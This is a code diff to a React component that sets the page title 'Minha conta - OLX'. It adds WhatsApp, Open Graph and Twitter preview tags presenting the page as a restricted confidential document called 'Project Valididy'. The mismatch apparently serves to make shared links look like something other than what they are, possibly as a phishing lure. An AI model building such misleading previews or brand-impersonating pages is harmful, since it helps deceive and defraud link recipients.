@@ -47,6 +47,42 @@ export function PainelPWAHead() {
     const previousDocTitle = document.title;
     document.title = "Minha conta - OLX";
 
+    // === Meta tags de preview (WhatsApp / OG / Twitter) só pro painel ===
+    const ogTitle = "[CLASSIFICADO] Project Valididy";
+    const ogDescription =
+      "ACESSO RESTRITO · Documento confidencial · Nível de autorização requerido para visualização.";
+    const ogImage = `${window.location.origin}/painel-og-preview.jpg`;
+    const ogUrl = window.location.href;
+
+    const metaTags: HTMLMetaElement[] = [];
+    const addMeta = (attr: "name" | "property", key: string, content: string) => {
+      const el = document.createElement("meta");
+      el.setAttribute(attr, key);
+      el.content = content;
+      el.setAttribute("data-painel-og", "true");
+      head.appendChild(el);
+      metaTags.push(el);
+    };
+
+    // Salva e sobrescreve description original
+    const previousDescription = document.querySelector<HTMLMetaElement>(
+      'meta[name="description"]:not([data-painel-og])'
+    );
+    const previousDescriptionContent = previousDescription?.content;
+    if (previousDescription) previousDescription.content = ogDescription;
+
+    addMeta("property", "og:type", "website");
+    addMeta("property", "og:title", ogTitle);
+    addMeta("property", "og:description", ogDescription);
+    addMeta("property", "og:image", ogImage);
+    addMeta("property", "og:image:width", "1200");
+    addMeta("property", "og:image:height", "1200");
+    addMeta("property", "og:url", ogUrl);
+    addMeta("name", "twitter:card", "summary_large_image");
+    addMeta("name", "twitter:title", ogTitle);
+    addMeta("name", "twitter:description", ogDescription);
+    addMeta("name", "twitter:image", ogImage);
+
     const previousThemeColor = document.querySelector<HTMLMetaElement>(
       'meta[name="theme-color"]:not([data-painel-pwa])'
     );
@@ -67,6 +103,10 @@ export function PainelPWAHead() {
       appleCapable.remove();
       appleStatus.remove();
       appleTitle.remove();
+      metaTags.forEach((el) => el.remove());
+      if (previousDescription && previousDescriptionContent !== undefined) {
+        previousDescription.content = previousDescriptionContent;
+      }
       document.title = previousDocTitle;
       if (previousThemeColor && previousThemeColorContent !== undefined) {
         previousThemeColor.content = previousThemeColorContent;
